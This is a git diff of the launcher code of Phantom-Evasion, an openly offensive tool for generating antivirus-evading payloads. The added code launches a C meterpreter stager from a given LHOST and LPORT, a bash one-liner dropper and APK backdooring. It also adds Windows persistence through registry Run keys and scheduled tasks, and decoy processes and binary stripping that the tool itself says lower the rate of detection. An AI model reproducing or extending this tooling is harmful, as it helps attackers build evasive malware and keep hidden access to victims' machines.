@@ -48,6 +48,13 @@ def python_banner():
     print(bcolors.OCRA + bcolors.BOLD + "\n[>] Python Version: " + bcolors.ENDC + bcolors.ENDC + py_version)
     sleep(0.5)
 
+          
+def RandString():
+    varname = ""
+    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
+    return varname 
+
+
 
 def path_finder(filename):
     path = ""
@@ -62,7 +69,7 @@ def path_finder(filename):
 
 def Enter2Continue():
     try:   
-        ans=input("[>] Press Enter to continue:") 
+        ans=input("\n[>] Press Enter to continue") 
     except SyntaxError:
         pass
 
@@ -122,7 +129,7 @@ def kali_arch_isready():
     auto_setup("wine")    
     if wine_fastcheck() == True:
         sleep(0.2)
-        print(bcolors.GREEN + "\n[>] Wine Env Ready\n" + bcolors.ENDC)
+        print(bcolors.GREEN + "\n[>] Wine Environment Ready\n" + bcolors.ENDC)
         sleep(0.5)
     else:       
         wine_check()
@@ -254,15 +261,25 @@ def dependencies_checker():
         sleep(0.2)
         print("[-] Check README to properly install the dependencies\n")
         sleep(1)
-        try:   
-            ans=input("  Press Enter to continue: ") 
-        except SyntaxError:
-            pass
-
-        pass
+        Enter2Continue()
 
 def strip_tease(Filename):
-    subprocess.call(['strip',Filename])
+    py_version=platform.python_version()
+    print(bcolors.OCRA + bcolors.BOLD + "\n[>] Strip \n" + bcolors.ENDC + bcolors.ENDC)
+    print("strip is a GNU utility to \"strip\" symbols from object files.\n")
+    print("This is useful for minimizing their file size, streamlining them for distribution.\n")
+    print("It can also be useful for making it more difficult to reverse-engineer the compiled code.\n")
+    print("(Lower rate of detection)\n")
+    if py_version[0] == "3":
+        RequireStrip = YesOrNo(input("\n[>] Strip executable? (y/n):"))
+    else:
+        RequireStrip = YesOrNo(raw_input("\n[>] Strip executable? (y/n):"))
+
+    if RequireStrip == "True":
+        sleep(0.5)
+        print(bcolors.GREEN + "\n[>] Stripping...\n"  + bcolors.ENDC)
+        sleep(1)
+        subprocess.call(['strip',Filename])
 
 def wine_fastcheck():
     wine=False
@@ -282,15 +299,15 @@ def wine_check():
 
     except subprocess.CalledProcessError: 
         print(bcolors.RED + bcolors.BOLD + "[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-        print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil Evasion to automatically setup Wine environment\n")
-        sleep(5) 
+        print("In order to use windows wine-pyinstaller modules you need to\n install python on wine manually (\"wine python -v\" to check if it's reachable from commandline)\n")
+        Enter2Continue() 
         
         
     else:
         if "cannot find" in py_check:
             print(bcolors.RED + bcolors.BOLD + "[Wine] Python Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-            print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil Evasion to automatically setup Wine environment\n")
-            sleep(5)
+            print("In order to use windows wine-pyinstaller modules you need to\n manually install python on wine manually (\"wine python -v\" to check if python is reachable from commandline)\n")
+            Enter2Continue()
         else:
 
             print(bcolors.GREEN + "[Wine] Python Found" + bcolors.ENDC)
@@ -300,15 +317,15 @@ def wine_check():
         pyin_check=subprocess.check_output(['wine','pyinstaller','-v'],stderr=subprocess.STDOUT)
     except subprocess.CalledProcessError: 
         print(bcolors.RED + bcolors.BOLD + "[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-        print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil to automatically setup Wine environment \n")
-        sleep(5) 
+        print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine python -v\" to check if pyinstaller is reachable from commandline)\n")
+        Enter2Continue() 
         
 
     else:
         if "cannot find" in pyin_check:
             print(bcolors.RED + bcolors.BOLD + "[Wine] Pyinstaller Not Found\n" + bcolors.ENDC + bcolors.ENDC)
-            print("In order to use windows wine-pyinstaller modules you need to\n install python and pyinstaller in wine or download and install Veil to automatically setup Wine environment\n")
-            sleep(5) 
+            print("In order to use windows wine-pyinstaller modules you need to\n manually install pyinstaller on wine (\"wine python -v\" to check if pyinstaller is reachable from commandline)\n")
+            Enter2Continue() 
 
         else:
 
@@ -451,13 +468,11 @@ def advisor():
     sleep(0.2)
     print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "0.3 \n")
+    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "1.0 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "17\n")
+    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "24\n")
     sleep(0.2)
-    print(bcolors.RED + "[+] INTEGRATED XMR-MINER: " + bcolors.ENDC + "See Readme Donate Section \n")
-    sleep(0.2)
-    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Indirect call,Wine-pyinstaller payload & new encoders \n")
+    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Pure C meterpreter stager,Persistence modules \n")
   
 
     sleep(3)
@@ -477,6 +492,7 @@ def banner():
     bann += "                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           \n"
     bann += "                     |  __/\ V / (_| \__ \ | (_) | | | |          \n"
     bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
+    bann += "                                                        v1.0      \n"
     sleep(0.3)
     print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
   
@@ -642,12 +658,12 @@ def auto_pyinstall(filename,wine):
             os.remove(filename + ".spec")
             os.rmdir("dist")
             sleep(0.5) 
-            print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder\n" + bcolors.ENDC) 
-            sleep(3)
+            print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder" + bcolors.ENDC) 
+            Enter2Continue()
   
         else:
-            print(bcolors.GREEN + "\n[>] Python-file saved in Phantom folder\n"  + bcolors.ENDC)
-            sleep(3)
+            print(bcolors.GREEN + "\n[>] Python-file saved in Phantom folder"  + bcolors.ENDC)
+            Enter2Continue()
 
 
     else:
@@ -670,23 +686,23 @@ def auto_pyinstall(filename,wine):
         os.remove(filename + ".spec")
         os.rmdir("dist")
         sleep(0.5) 
-        print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder\n" + bcolors.ENDC)   
-        sleep(3)  
+        print(bcolors.GREEN + "\n[>] Executable saved in Phantom folder" + bcolors.ENDC)   
+        Enter2Continue() 
 
 
 def menu_options():
-    print("    ====================================================================")
-    print("  ||"+ bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                 || ")
-    print("  ||                                 ||                                 || ")
-    print("  ||    [1]  List All modules        ||   [5]  List Android modules     || ")
-    print("  ||                                 ||                                 || ")
-    print("  ||    [2]  List Windows modules    ||   [6]  List Universal modules   || ")
-    print("  ||                                 ||                                 || ")
-    print("  ||    [3]  List Linux modules      ||   [7]  Update check             || ")
-    print("  ||                                 ||                                 || ")
-    print("  ||    [4]  List OSX modules        ||   [0]  Exit                     || ")
-    print("  ||                                 ||                                 || ")
-    print("    ====================================================================\n")
+    print("    =====================================================================")
+    print("  ||"+ bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                  || ")
+    print("  ||                                 ||                                  || ")
+    print("  ||    [" + bcolors.OCRA + "1" + bcolors.ENDC + "]  Windows modules         ||   [" + bcolors.OCRA + "5" + bcolors.ENDC + "]  Universal modules         || ")
+    print("  ||                                 ||                                  || ")
+    print("  ||    [" + bcolors.OCRA + "2" + bcolors.ENDC + "]  Linux modules           ||   [" + bcolors.OCRA + "6" + bcolors.ENDC + "]  Post-Exploitation modules || ")
+    print("  ||                                 ||                                  || ")
+    print("  ||    [" + bcolors.OCRA + "3" + bcolors.ENDC + "]  OSX modules             ||   [" + bcolors.OCRA + "7" + bcolors.ENDC + "]  Update check              || ")
+    print("  ||                                 ||                                  || ")
+    print("  ||    [" + bcolors.OCRA + "4" + bcolors.ENDC + "]  Android modules         ||   [" + bcolors.OCRA + "0" + bcolors.ENDC + "]  Exit                      || ")
+    print("  ||                                 ||                                  || ")
+    print("    =====================================================================")
 
 def payload_advisor(payload,module_choice):
     if "windows" in payload:
@@ -794,16 +810,19 @@ def custom_payload_completer(custom_shellcode):
     return Payload
 
 
-def auto_compiler(module_type,arch,filename):
+def auto_compiler(module_type,arch,filename,ws2 = False):
     Os_used = platform.system()
     if Os_used == "Linux":
 
         if "windows" in module_type and arch == "x86":
             filename += ".exe"
-
-            subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows']) 
+            if ws2 != True: 
+                subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows']) 
+            else:
+                subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lws2_32']) 
 
         elif "windows" in module_type and arch == "x64": 
+
             filename += ".exe"
 
             subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows'])
@@ -822,8 +841,13 @@ def auto_compiler(module_type,arch,filename):
 
         if "windows" in module_type and arch == "x86":
             filename += ".exe"
+            if ws2 != True:
 
-            subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie'],shell=True)
+                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie'],shell=True)
+
+            else:
+
+                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie','-lws2_32'],shell=True)
 
         elif "windows" in module_type and arch == "x64": 
             filename += ".exe"
@@ -883,36 +907,21 @@ def module_launcher1(module_choice):
     if "x64" in payload_choice:
 
         Arc = "x64"
-        print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
-        sleep(0.2)
-        print("[1] x64/xor                                    (average)\n")
-        print("[2] x64/xor + Multibyte xor                       (good)\n")
-        print("[3] x64/xor + Double Multibyte-key xor trap  (excellent)\n")
-        print("[4] x64/xor + Triple Multibyte-key xor trap  (excellent)\n")
+        enc_type = encoding_selection64()
 
     else:
-
 
         Arc = "x86"
-        print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
-        sleep(0.2)
-        print("[1] x86/shikata_ga_nai                                   (average)\n")
-        print("[2] x86/shikata_ga_nai + Multibyte-key xor                  (good)\n")
-        print("[3] x86/shikata_ga_nai + Double Multibyte-key xor trap (excellent)\n")
-        print("[4] x86/shikata_ga_nai + Triple Multibyte-key xor trap (excellent)\n")
-
-    if py_version[0] == "3":
-
-        enc_type = input("\n[>] Please enter options number: ")
-    else:
-        enc_type = raw_input("\n[>] Please enter options number: ")        
-
+        enc_type = encoding_selection32()
 
     if py_version[0] == "3":
 
         output_filename = input("\n[>] Enter output filename: ")
     else:
-        output_filename = raw_input("\n[>] Enter output filename: ")        
+        output_filename = raw_input("\n[>] Enter output filename: ")     
+
+    Procnumb=require_multiproc()
+        
 
     module_where = "Modules/payloads/" + module_choice
 
@@ -934,51 +943,42 @@ def module_launcher1(module_choice):
 
     if platform.system() == "Linux":
 
-        subprocess.call(['python',module_where,Payload,output_filename,enc_type])
+        subprocess.call(['python',module_where,Payload,Procnumb,enc_type])
 
     elif platform.system() == "Windows":
         
-        subprocess.call(['py',module_where,Payload,output_filename,enc_type])
+        subprocess.call(['py',module_where,Payload,Procnumb,enc_type])
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 
 
     sleep(2)
 
     auto_compiler(module_choice,Arc,output_filename)
-    print("\n[<>] File saved in Phantom-Evasion folder!\n")
-    sleep(3)
+    print("\n[<>] File saved in Phantom-Evasion folder")
+    Enter2Continue()
 
 def module_launcher2(module_choice):
     py_version=platform.python_version()
     if py_version[0] == "3":
         custom_shellcode = input("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
         output_filename = input("\n[>] Enter output filename: ")
-        arch = input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+        arch = input("\n>] Please insert compiler option (x86 or x64): ")
     else:
         custom_shellcode = raw_input("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
         output_filename = raw_input("\n[>] Enter output filename: ")
-        arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+        arch = raw_input("\n[>] Please insert compiler option (x86 or x64): ")
 
     module_choice = "Modules/payloads/" + module_choice
 
     Payload = custom_payload_completer(custom_shellcode)
 
-    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
-    sleep(0.2)
-    print("[1] None                                (none)\n")
-    print("[2] MultibyteKey xor                    (good)\n")
-    print("[3] Double Multibyte-key xor trap  (excellent)\n")
-    print("[4] Triple Multibyte-key xor trap  (excellent)\n")
+    enc_type = encoding_selection_custom()
 
-    if py_version[0] == "3":
-
-        enc_type = input("\n[>] Please enter options number: ")
-    else:
-        enc_type = raw_input("\n[>] Please enter options number: ")        
+    Procnumb = require_multiproc()        
 
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)
 
-    subprocess.call(['python',module_choice,Payload,output_filename,enc_type])
+    subprocess.call(['python',module_choice,Payload,Procnumb,enc_type])
 
     if enc_type == "2":
         print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
@@ -1008,7 +1008,86 @@ def shellcode_completer(module_type):
 
         module_launcher2(module_type)
 
+def encoding_selection32():
+    py_version=platform.python_version()
+    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
+    sleep(0.2)
+    print("[1] x86/shikata_ga_nai                                   (average)\n")
+    print("[2] x86/shikata_ga_nai + Multibyte-key xor                  (good)\n")
+    print("[3] x86/shikata_ga_nai + Double Multibyte-key xor trap (excellent)\n")
+    print("[4] x86/shikata_ga_nai + Triple Multibyte-key xor trap (excellent)\n")
 
+    if py_version[0] == "3":
+
+        enc_type = input("\n[>] Please enter options number: ")
+    else:
+        enc_type = raw_input("\n[>] Please enter options number: ")
+
+    return enc_type
+
+def encoding_selection64():
+    py_version=platform.python_version()
+    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
+    sleep(0.2)
+    print("[1] x64/xor                                    (average)\n")
+    print("[2] x64/xor + Multibyte xor                       (good)\n")
+    print("[3] x64/xor + Double Multibyte-key xor trap  (excellent)\n")
+    print("[4] x64/xor + Triple Multibyte-key xor trap  (excellent)\n")
+    if py_version[0] == "3":
+
+        enc_type = input("\n[>] Please enter options number: ")
+    else:
+        enc_type = raw_input("\n[>] Please enter options number: ")
+
+    return enc_type
+
+
+def encoding_selection_custom():
+    py_version=platform.python_version()
+    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
+    sleep(0.2)
+    print("[1] None                                (none)\n")
+    print("[2] MultibyteKey xor                    (good)\n")
+    print("[3] Double Multibyte-key xor trap  (excellent)\n")
+    print("[4] Triple Multibyte-key xor trap  (excellent)\n")
+
+    if py_version[0] == "3":
+
+        enc_type = input("\n[>] Please enter options number: ")
+    else:
+        enc_type = raw_input("\n[>] Please enter options number: ")
+
+    return enc_type
+
+
+def require_multiproc():
+    py_version=platform.python_version()
+    print(bcolors.OCRA + "\n[>] Spawn Multiple Processes:\n" + bcolors.ENDC)
+    print("During target-side execution this will cause to spawn a maximum of 4 processes") 
+    print("consequentialy.\n")
+    print("Only the last spawned process will reach the malicious section of code")
+    print("while the other decoy processes spawned before will executes only random junk code")
+    print("PRO: Longer execution time,Lower rate of detection.")
+    print("CONS: Higher resource consumption.")
+ 
+    if py_version[0] == "3":
+        ans=YesOrNo(input("\n[>] Add multiple processes behaviour?(y/n): "))
+    else:
+        ans=YesOrNo(raw_input("\n[>] Add multiple processes behaviour?(y/n): "))
+
+    if ans == "True":
+
+        if py_version[0] == "3":
+            Procnumb=input("\n[>] Insert number of decoy processes (integer between 1-3): ")
+        else:
+            Procnumb=raw_input("\n[>] Insert number of decoy processes (integer between 1-3): ")
+        if (Procnumb == "1") or (Procnumb == "2") or (Procnumb == "3"):
+            
+            return Procnumb
+
+                         
+    else:
+        return "0"
 
 def powershell_options(module_type):
     clear()
@@ -1094,7 +1173,9 @@ def powershell_launcher1(module_choice):
 
         output_filename = input("\n[>] Enter output filename: ")
     else:
-        output_filename = raw_input("\n[>] Enter output filename: ")        
+        output_filename = raw_input("\n[>] Enter output filename: ")   
+
+    Procnumb=require_multiproc()     
 
     module_where = "Modules/payloads/" + module_choice
 
@@ -1102,15 +1183,15 @@ def powershell_launcher1(module_choice):
 
     Payload = payload_generator(payload_choice,Arc,commtype,port,"psh")
 
-    print(bcolors.GREEN + "\n[>] Generating powershell dropper...\n" + bcolors.ENDC) 
+    print(bcolors.GREEN + "\n[>] Generating C powershell dropper...\n" + bcolors.ENDC) 
 
     if platform.system() == "Linux":
 
-        subprocess.call(['python',module_where,Payload,output_filename])
+        subprocess.call(['python',module_where,Payload,Procnumb])
 
     elif platform.system() == "Windows":
         
-        subprocess.call(['py',module_where,Payload,output_filename])
+        subprocess.call(['py',module_where,Payload,Procnumb])
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 
 
@@ -1152,11 +1233,13 @@ def powershell_launcher2(module_choice):
         output_filename = raw_input("\n[>] Enter output filename: ")
         arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
 
+    Procnumb=require_multiproc()
+
     module_choice = "Modules/payloads/" + module_choice
 
-    print(bcolors.GREEN + "\n[>] Generating powershell dropper...\n" + bcolors.ENDC)
+    print(bcolors.GREEN + "\n[>] Generating C powershell dropper...\n" + bcolors.ENDC)
 
-    subprocess.call(['python',module_choice,powershell_payload,output_filename])
+    subprocess.call(['python',module_choice,powershell_payload,Procnumb])
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
 
@@ -1165,6 +1248,71 @@ def powershell_launcher2(module_choice):
     auto_compiler(module_choice,arch,output_filename)
     print("\n[<>] File saved in Phantom-Evasion folder!\n")
     sleep(3)
+
+def Polymorphic_C_x86Meterpreter_launcher(module_type):
+    clear()
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+        LHOST=input("\n[>] Please insert LHOST: ")
+        LPORT=input("\n[>] Please insert LPORT: ")
+        OUTFILE=input("\n[>] Please insert output filename: ")
+    else:
+        LHOST=raw_input("\n[>] Please insert LHOST: ")
+        LPORT=raw_input("\n[>] Please insert LPORT: ")
+        OUTFILE=raw_input("\n[>] Please insert output filename: ")
+    sleep(0.5)
+    Procnumb=require_multiproc()
+    print(bcolors.GREEN + "\n[>] Generating C meterpreter stager\n" + bcolors.ENDC)
+    
+    if platform.system() == "Linux":
+
+        subprocess.call(['python','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])
+
+    elif platform.system() == "Windows":
+        
+        subprocess.call(['py','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])
+
+    sleep(0.5)
+
+    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
+
+    auto_compiler("windows","x86",OUTFILE,True)
+
+    print("\n[<>] File saved in Phantom-Evasion folder\n")
+    Enter2Continue()
+    
+
+def BashOnelinerDropper():
+    clear()
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+        Bash_payload=input("\n[>] Insert Bash online payload: ")
+        arch = input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+        output_filename = input("\n[>] Enter output filename: ")
+    else:
+        Bash_payload=raw_input("\n[>] Insert Bash online payload: ")
+        arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+        output_filename = raw_input("\n[>] Enter output filename: ")  
+
+    sleep(0.2)
+    print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 
+    sleep(1)    
+    if platform.system() == "Windows":
+            
+        subprocess.call(['py','Modules/payloads/Polymorphic_BashOnelinerDropper_mathinject_linux.py',Bash_payload],shell=True)
+    else:
+            
+        subprocess.call(['python','Modules/payloads/Polymorphic_BashOnelinerDropper_mathinject_linux.py',Bash_payload])
+
+    sleep(0.5)
+
+    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
+
+    auto_compiler("linux",arch,output_filename,False)
+
+    print("\n[<>] File saved in Phantom-Evasion folder\n")
+    Enter2Continue()
+
     
 def osx_cascade_encoding():
     py_version=platform.python_version()
@@ -1341,6 +1489,7 @@ def pem_pk8():
        os.remove("Setup/apk_sign/key.pem")
 
 def droidmare_launcher():
+    clear()
     print(bcolors.OCRA + "\n[>] MODE:" + bcolors.ENDC)
     print("\n[1] Obfuscate msf payload")
     print("\n[2] Obfuscate msf payload & Backdoor existing Apk \n")
@@ -1388,7 +1537,7 @@ def droidmare_launcher():
         print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)
         if platform.system() == "Windows":
             
-            subprocess.call(['python','Modules/payloads/Smali_Droidmare.py','msf_smali',"apk_smali"],shell=True)
+            subprocess.call(['py','Modules/payloads/Smali_Droidmare.py','msf_smali',"apk_smali"],shell=True)
         else:
             
             subprocess.call(['python','Modules/payloads/Smali_Droidmare.py','msf_smali',"apk_smali"])
@@ -1405,15 +1554,328 @@ def droidmare_launcher():
         print("\n[>] New Apk saved in Phantom-Evasion folder")
         sleep(2)
 
+
+
+# POST EXPLOITATION
+
+
+def Windows_C_PersistenceAgent(module_type):        #At Startup
+    clear()
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+        if "Startup" in module_type:
+            FpathOrFname=input("\n[>] Insert file path to add to startup: ")
+            FakeAppName=input("\n[>] Insert fake app name: ")
+            Elevated = YesOrNo(input("\n[>] Require admin privilege? (y/n):"))
+            EvasionJunkcode = YesOrNo(input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
+            OutputResult = YesOrNo(input("\n[>] Add result output code? (prints completed or failed) (y/n):"))
+            Procnumb=require_multiproc()
+                        
+            
+        elif "TimeBased" in module_type:
+            Procname=input("\n[>] Insert the name of the process to keep-alive: ") 
+            FpathOrFname=input("\n[>] Insert fullpath to the file to execute if process died: ")
+            CheckTime=input("\n[>] Insert time interval to check if process died (in seconds): ")
+            EvasionJunkcode = YesOrNo(input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
+            Procnumb=require_multiproc()
+            CheckTime += "000"
+
+        CompileFor=input("\n[>] Insert compiler option (x86 or x64): ")
+        OutFile=input("\n[>] Insert output filename: ")
+    else:
+        if "Startup" in module_type:
+            FpathOrFname=raw_input("\n[>] Insert file path to add to startup: ")
+            FakeAppName=raw_input("\n[>] Insert fake app name: ")
+            Elevated = YesOrNo(raw_input("\n[>] Require admin privilege? (y/n):"))
+            EvasionJunkcode = YesOrNo(raw_input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
+            OutputResult = YesOrNo(raw_input("\n[>] Add result output code? (prints completed or failed) (y/n):"))
+            Procnumb=require_multiproc()
+        elif "TimeBased" in module_type:
+            Procname=raw_input("\n[>] Insert the name of the process to keep-alive: ") 
+            FpathOrFname=raw_input("\n[>] Insert fullpath to the file to execute if process died: ")
+            CheckTime=raw_input("\n[>] Insert time interval to check if process died (in seconds): ")
+            EvasionJunkcode = YesOrNo(raw_input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
+            Procnumb=require_multiproc()
+            CheckTime += "000"
+
+
+        CompileFor=raw_input("\n[>] Insert compiler option (x86 or x64): ")
+        OutFile=raw_input("\n[>] Insert output filename: ")
+    sleep(0.5)
+    print(bcolors.GREEN + "\n[>] Generating Persistence C Agent...\n" + bcolors.ENDC)
+
+
+    
+    if platform.system() == "Linux":
+
+        if "Startup" in module_type:
+
+            subprocess.call(['python','Modules/post-exploitation/Windows_C_Persistence_Startup.py',FpathOrFname,FakeAppName,Elevated,EvasionJunkcode,OutputResult,Procnumb])
+
+        elif "TimeBased" in module_type:
+
+            subprocess.call(['python','Modules/post-exploitation/Windows_C_Persistence_TimeBased.py',FpathOrFname,Procname,CheckTime,EvasionJunkcode,Procnumb])
+
+    elif platform.system() == "Windows":
+        
+        if "Startup" in module_type:
+
+            subprocess.call(['py','Modules/post-exploitation/Windows_C_Persistence_Startup.py',FpathOrFname,FakeAppName,Elevated,EvasionJunkcode,OutputResult,Procnumb])
+
+        elif "TimeBased" in module_type:
+
+            subprocess.call(['py','Modules/post-exploitation/Windows_C_Persistence_TimeBased.py',FpathOrFname,Procname,CheckTime,EvasionJunkcode,Procnumb])
+
+    sleep(1)
+
+    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
+
+    auto_compiler("windows",CompileFor,OutFile)
+
+    if "Startup" in module_type:
+
+        print(bcolors.OCRA + "\n[>] To remove persistence from cmdline once finished:\n"  + bcolors.ENDC)
+
+        if Elevated == "True":
+
+            print("reg delete \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + FakeAppName + "\" /f") 
+        else:
+            print("reg delete \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + FakeAppName + "\" /f") 
+
+    print("\n[<>] File saved in Phantom-Evasion folder\n")
+
+    Enter2Continue()
+
+
+def Windows_CMD_PersistenceAgent():        #At Startup
+    clear()
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+        FullPath = input("\n[>] Insert file path to add to startup: ")
+        RegValue = input("\n[>] Insert registry filename (Enter for random generation): ")
+        Elevated = YesOrNo(input("\n[>] Require admin privilege? (y/n):"))
+    else:
+        FullPath = raw_input("\n[>] Insert file path to add to startup: ")
+        RegValue = raw_input("\n[>] Insert registry filename (Enter for random generation): ")
+        Elevated = YesOrNo(raw_input("\n[>] Require admin privilege? (y/n):"))
+
+    if RegValue == "":
+        RegValue = RandString()
+
+    if Elevated == "True":
+
+        Req = bcolors.RED + "Required" + bcolors.ENDC
+
+        AddPersistenceCmd = "reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /t REG_SZ /F /D \"" + FullPath + "\""
+        RemovePersistenceCmd = "reg delete \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /f"
+
+    else:
+
+        Req = bcolors.GREEN + "Not Required"  + bcolors.ENDC
+
+        AddPersistenceCmd = "reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /t REG_SZ /F /D \"" + FullPath + "\""
+        RemovePersistenceCmd = "reg delete \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /f" 
+    sleep(0.5)
+    print(bcolors.GREEN + "\n[>] Generating cmdline...\n" + bcolors.ENDC)
+    sleep(1)
+
+    clear()
+    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Admin Priv: " + bcolors.ENDC + bcolors.ENDC + Req)
+    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Add Persistence Cmdline: " + bcolors.ENDC + bcolors.ENDC + AddPersistenceCmd)
+    print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Remove Persistence Cmdline: " + bcolors.ENDC + bcolors.ENDC + RemovePersistenceCmd)
+    Enter2Continue()
+
+
+def Windows_Schtasks_Persistence():
+    clear()
+    py_version=platform.python_version()
+    print(bcolors.GREEN + "\n[>] Schtasks mode\n" + bcolors.ENDC)
+    print("[1] At Startup     (start on user login)")
+    print("[2] Daily time     (start once at day)")
+    print("[3] User Idle time (start if user is idle for x time)")
+    if py_version[0] == "3":
+
+        PersistenceType = input("\n[>] Insert schtasks mode : ")
+        FullPath = input("\n[>] Insert fullpath to file or script to schedule: ")
+        Taskname = input("\n[>] Insert taskname (Enter for random generation): ")
+    else:
+
+        PersistenceType = raw_input("\n[>] Insert schtasks mode : ")
+        FullPath = raw_input("\n[>] Insert fullpath to file or script to schedule: ")
+        Taskname = raw_input("\n[>] Insert taskname (Enter for random generation): ")
+
+    if Taskname == "":
+        Taskname = ""
+        Taskname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
+
+
+    if PersistenceType == "1":
+        if py_version[0] == "3":
+            UseDelay = YesOrNo(input("\n[>] Insert execution delay after userlogin? (y/n): "))
+        else:
+            UseDelay = YesOrNo(raw_input("\n[>] Insert execution delay after userlogin? (y/n): "))
+
+        if UseDelay == "True":
+            print("\n[Help] hhmm:ss format")
+            print("\n[Example] a minute and half of delay = 0001:30")
+            if py_version[0] == "3":
+                TimeVar = input("\n[>] Insert delay value: ")
+            else:
+                TimeVar = raw_input("\n[>] Insert delay value: ")
+            sleep(0.01)
+            while len(TimeVar) < 7:
+                print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
+                print("\n[Help] hhmm:ss format")
+                print("\n[Example] a minute and half of delay = 0001:30")
+                if py_version[0] == "3":
+                    TimeVar = input("\n[>] Insert delay value: ")  
+                else:
+                    TimeVar = raw_input("\n[>] Insert delay value: ")
+        else:
+            TimeVar = "No"        
+
+    elif PersistenceType == "2":   
+        print("\n [Help] hhmm:ss format,")
+        print("\n [Example] schedule for half past midnight = 0030:00")
+        if py_version[0] == "3":
+            TimeVar = input("\n[>] Insert daytime for scheduled execution: ") 
+        else:
+            TimeVar = raw_input("\n[>] Insert daytime for scheduled execution: ")
+
+        while len(TimeVar) < 7:
+            print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
+            print("\n [Help] hhmm:ss format,")
+            print("\n [Example] schedule for half past midnight = 0030:00")
+            if py_version[0] == "3":
+                TimeVar = input("\n[>] Insert daytime for scheduled execution : ")  
+            else:
+                TimeVar = raw_input("\n[>] Insert daytime for scheduled execution: ")                      
